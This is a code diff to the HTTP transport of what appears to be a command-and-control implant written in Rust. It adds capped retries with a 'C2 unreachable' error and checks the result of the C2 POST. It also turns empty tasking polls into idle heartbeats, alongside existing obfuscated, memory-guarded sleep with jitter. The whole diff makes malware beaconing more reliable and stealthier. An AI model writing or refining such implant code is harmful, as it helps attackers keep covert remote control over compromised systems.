@@ -37,7 +37,13 @@ impl HttpTransport {
 
     async fn connect_with_retry(&self, req_builder: reqwest::RequestBuilder) -> Result<reqwest::Response> {
         let mut delay = 1;
+        let mut attempt = 0u32;
+        const MAX_ATTEMPTS: u32 = 8;
         loop {
+            attempt += 1;
+            if attempt > MAX_ATTEMPTS {
+                anyhow::bail!("C2 unreachable after {} attempts; giving up", MAX_ATTEMPTS);
+            }
             // Apply jitter to backoff
             let jitter = rand::random::<f64>() * 0.2 + 0.9;
             let current_delay = (delay as f64 * jitter) as u64;
@@ -80,7 +86,10 @@ impl Transport for HttpTransport {
 
         // POST request
         let req = self.client.post(format!("{}{}", endpoint, self.profile.uri)).body(ciphertext);
-        let _resp = self.connect_with_retry(req).await?;
+        let resp = self.connect_with_retry(req).await?;
+        if !resp.status().is_success() {
+            anyhow::bail!("C2 POST returned HTTP {}", resp.status());
+        }
         
         Ok(())
     }
@@ -102,10 +111,18 @@ impl Transport for HttpTransport {
         let bytes = resp.bytes().await?;
 
         if bytes.is_empty() {
-            // No tasking, sleep w/ jitter
+            // No tasking: sleep with jitter then signal the caller with a Heartbeat
+            // so the main loop continues rather than treating this as a transport error.
             let sleep_dur = crate::obfuscated_sleep::calculate_jittered_sleep(&common::config::SleepConfig::default());
             crate::memory_guard::guarded_sleep(sleep_dur, None).await?;
-            return Err(anyhow::anyhow!("No tasking available"));
+            return Ok(Message::Heartbeat {
+                timestamp: std::time::SystemTime::now()
+                    .duration_since(std::time::UNIX_EPOCH)
+                    .unwrap_or_default()
+                    .as_secs(),
+                agent_id: String::new(),
+                status: "idle".to_string(),
+            });
         }
 
         // Decrypt and deserialize
